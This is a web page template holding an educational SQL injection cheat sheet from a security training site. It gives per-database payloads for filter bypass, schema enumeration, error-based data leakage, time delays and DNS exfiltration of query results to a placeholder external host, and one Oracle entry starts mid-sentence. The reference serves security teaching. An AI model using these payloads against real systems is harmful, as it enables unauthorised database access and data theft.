@extends('layouts.academy')

@section('title', 'SQL injection cheat sheet | Web Security Academy | '.config('app.name'))
@section('legacy_css', '/content/pswebsecacademy.css')

@section('academy_body')
@verbatim
<div class="wrapper-large">
    <div class="container-academy">

        <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
        <aside class="nav-lhs" id="tree-nav" tree-nav-version="36">
            <nav class="nav-lhs-scrollable">
                <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label>
                

        <a class="nav-back" href="/web-security/all-topics">
            <span class="icon-arrow-head-left"></span>
            Back to all topics
        </a>
        <input type="checkbox" id="nav-main-id">
        <label class="nav-label" for="nav-main-id">
            <span class="icon-arrow-head-down"></span>
        </label>
        <h3>SQL injection</h3>
        <ul>
            <li><a href="/web-security/sql-injection#what-is-sql-injection-sqli">What is SQL injection?</a></li>
            <li><a href="/web-security/sql-injection#what-is-the-impact-of-a-successful-sql-injection-attack">What is the impact of SQL injection?</a></li>
            <li>
                <input type="checkbox" id="sub-nav-id-3">
                <label for="sub-nav-id-3">
                    <a href="/web-security/sql-injection#how-to-detect-sql-injection-vulnerabilities">Detecting SQL injection vulnerabilities</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection#sql-injection-in-different-parts-of-the-query">In different parts of the query</a></li>
                    <li><a href="/web-security/sql-injection#sql-injection-in-different-contexts">In different contexts</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-2">
                <label for="sub-nav-id-2">
                    <a href="/web-security/sql-injection#sql-injection-examples">Examples of SQL injection</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection#retrieving-hidden-data">Retrieving hidden data</a></li>
                    <li><a href="/web-security/sql-injection#subverting-application-logic">Subverting application logic</a></li>
                    <li><a href="/web-security/sql-injection#retrieving-data-from-other-database-tables">Retrieving data from other tables</a></li>
                    <li><a href="/web-security/sql-injection#examining-the-database">Examining the database</a></li>
                    <li><a href="/web-security/sql-injection#blind-sql-injection-vulnerabilities">Blind SQL injection</a></li>
                    <li><a href="/web-security/sql-injection#second-order-sql-injection">Second-order SQL injection</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-7">
                <label for="sub-nav-id-7">
                    <a href="/web-security/sql-injection/examining-the-database">Examining the database</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection/examining-the-database#querying-the-database-type-and-version">Querying the type and version</a></li>
                    <li><a href="/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database">Listing the contents</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-6">
                <label for="sub-nav-id-6">
                    <a href="/web-security/sql-injection/union-attacks">UNION attacks</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection/union-attacks#determining-the-number-of-columns-required">Determining the number of columns</a></li>
                    <li><a href="/web-security/sql-injection/union-attacks#finding-columns-with-a-useful-data-type">Finding columns with a useful data type</a></li>
                    <li><a href="/web-security/sql-injection/union-attacks#using-a-sql-injection-union-attack-to-retrieve-interesting-data">Retrieving interesting data</a></li>
                    <li><a href="/web-security/sql-injection/union-attacks#retrieving-multiple-values-within-a-single-column">Retrieving multiple values in a single column</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-8">
                <label for="sub-nav-id-8">
                    <a href="/web-security/sql-injection/blind">Blind SQL injection</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection/blind#what-is-blind-sql-injection">What is blind SQL injection?</a></li>
                    <li><a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses">Triggering conditional responses</a></li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-9">
                        <label for="sub-nav-id-9">
                            <a href="/web-security/sql-injection/blind#error-based-sql-injection">Error-based SQL injection</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors">Inferring information using conditional errors</a></li>
                            <li><a href="/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages">Extracting data via verbose error messages</a></li>
                        </ul>
                    </li>
                    <li><a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays">Triggering time delays</a></li>
                    <li><a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-oast-techniques">Out-of-band (OAST) techniques</a></li>
                    <li><a href="/web-security/sql-injection/blind#how-to-prevent-blind-sql-injection-attacks">Preventing blind SQL injection</a></li>
                </ul>
            </li>
            <li><a href="/web-security/sql-injection#how-to-prevent-sql-injection">How to prevent SQL injection</a></li>
            <li><a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></li>
            <li><a href="/web-security/all-labs#sql-injection">View all SQL injection labs</a></li>
        </ul>
    
            </nav>
        </aside>
        <main>
            



<ul class="breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/sql-injection"><span itemprop="name">SQL injection</span></a><meta itemprop="position" content="2" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/sql-injection/cheat-sheet"><span itemprop="name">Cheat sheet</span></a><meta itemprop="position" content="3" /></li></ul>    <div class="section theme-white">

        <h1 class="heading-2">SQL injection cheat sheet</h1><p>
            This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.
        </p><h2 id="string-concatenation">String concatenation</h2><p>
            You can concatenate together multiple strings to make a single string.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
                    'foo'||'bar'
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    'foo'+'bar'
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    'foo'||'bar'
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td>
                    <code>'foo' 'bar'</code> [Note the space between the two strings]<br>
                    <code>CONCAT('foo','bar')</code><br>
                </td>
            </tr>
        </table><h2 id="substring">Substring</h2><p>
            You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string <code>ba</code>.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
SUBSTR('foobar', 4, 2)
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
SUBSTRING('foobar', 4, 2)
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
SUBSTRING('foobar', 4, 2)
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td><code>
SUBSTRING('foobar', 4, 2)
                </code></td>
            </tr>
        </table><h2 id="comments">Comments</h2><p>
            You can use comments to truncate a query and remove the portion of the original query that follows your input.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
                    --comment<br>
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    --comment<br>
                    /*comment*/
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    --comment<br>
                    /*comment*/
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td>
                    <code>#comment</code><br>
                    <code>-- comment</code> [Note the space after the double dash]<br>
                    <code>/*comment*/</code>
                </td>
            </tr>
        </table><h2 id="bypassing-filters">Bypassing filters</h2><p>
            If an application blocks specific keywords or characters, you may still be able to inject SQL using the following techniques. Encoding-based bypasses, such as URL-encoding keywords or using <code>CHAR()</code> to construct strings, are covered separately in <a href="/web-security/essential-skills/obfuscating-attacks-using-encodings">Obfuscating attacks using encodings</a>.
        </p><p>
            SQL keywords are not case-sensitive, so you can vary the case of your input to bypass a filter that blocks a specific keyword. For example, if <code>SELECT</code> is blocked, try <code>SeLeCT</code>.
        </p><p>
            You can also use inline comments in place of whitespace, so that a filter looking for a keyword surrounded by spaces does not match. For example, <code>SELECT/**/username/**/FROM/**/users</code>.
        </p><p>
            On MySQL, you can use versioned comments to hide a keyword from a filter while still having the database execute it. The database runs the contents of a <code>/*! ... */</code> comment, so <code>/*!SELECT*/</code> is treated as <code>SELECT</code>.
        </p><h2 id="database-version">Database version</h2><p>
            You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
                    SELECT banner FROM v$version<br>
                    SELECT version FROM v$instance<br>
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    SELECT @@version
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    SELECT version()
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td><code>
                    SELECT @@version
                </code></td>
            </tr>
        </table><h2 id="database-contents">Database contents</h2><p>
            You can list the tables that exist in the database, and the columns that those tables contain.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
                    SELECT * FROM all_tables<br>
                    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    SELECT * FROM information_schema.tables<br>
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    SELECT * FROM information_schema.tables<br>
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td><code>
                    SELECT * FROM information_schema.tables<br>
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>
                </code></td>
            </tr>
        </table><h2 id="conditional-errors">Conditional errors</h2><p>
            You can test a single boolean condition and trigger a database error if the condition is true.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td><code>
                    SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
                </code></td>
            </tr>
        </table><h2 id="extracting-data-via-visible-error-messages">Extracting data via visible error messages</h2><p>
            You can potentially elicit error messages that leak sensitive data returned by your malicious query.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code class="code-scrollable">SELECT 'foo' WHERE 1 = (SELECT 'secret')
&gt; Conversion failed when converting the varchar value 'secret' to data type int.</code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code class="code-scrollable">SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
&gt; invalid input syntax for integer: "secret"</code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td><code class="code-scrollable">SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
&gt; XPATH syntax error: '\secret'</code></td>
            </tr>
        </table><h2 id="batched-or-stacked-queries">Batched (or stacked) queries</h2><p>
            You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
                    Does not support batched queries.
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    QUERY-1-HERE; QUERY-2-HERE<br>
                    QUERY-1-HERE QUERY-2-HERE
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    QUERY-1-HERE; QUERY-2-HERE
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td><code>
                    QUERY-1-HERE; QUERY-2-HERE
                </code></td>
            </tr>
        </table><div class="highlightedarea">
            <h4>Note</h4>
            <p>
                With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
            </p>
        </div><h2 id="time-delays">Time delays</h2><p>
            You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
                    dbms_pipe.receive_message(('a'),10)
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    WAITFOR DELAY '0:0:10'
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    SELECT pg_sleep(10)
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td><code>
                    SELECT SLEEP(10)
                </code></td>
            </tr>
        </table><h2 id="conditional-time-delays">Conditional time delays</h2><p>
            You can test a single boolean condition and trigger a time delay if the condition is true.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td><code>
                    SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
                </code></td>
            </tr>
        </table><h2 id="dns-lookup">DNS lookup</h2><p>
            You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use <a href="/web-security/all-labs">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td>
                    <p>(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p>
                    <code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code>
                    <p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p>
                    <code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code>
                </td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td>
                    <p>The following techniques work on Windows only:</p>
                    <code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br>
                    <code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
                </td>
            </tr>
        </table><h2 id="dns-lookup-with-data-exfiltration">DNS lookup with data exfiltration</h2><p>
            You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use <a href="/web-security/all-labs">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Oracle
                </th>
                <td><code>
                    SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual
                </code></td>
            </tr>
            <tr>
                <th>
                    Microsoft
                </th>
                <td><code>
                    declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
                </code></td>
            </tr>
            <tr>
                <th>
                    PostgreSQL
                </th>
                <td><code>
                    create OR replace function f() returns void as $$<br>
                    declare c text;<br>
                    declare p text;<br>
                    begin<br>
                    SELECT into p (SELECT YOUR-QUERY-HERE);<br>
                    c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';<br>
                    execute c;<br>
                    END;<br>
                    $$ language plpgsql security definer;<br>
                    SELECT f();
                </code></td>
            </tr>
            <tr>
                <th>
                    MySQL
                </th>
                <td>
                    The following technique works on Windows only:<br>
                    <code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
                </td>
            </tr>
        </table>
        
    </div>


    
    

            
        </main>
    </div>
</div>
@endverbatim
@endsection
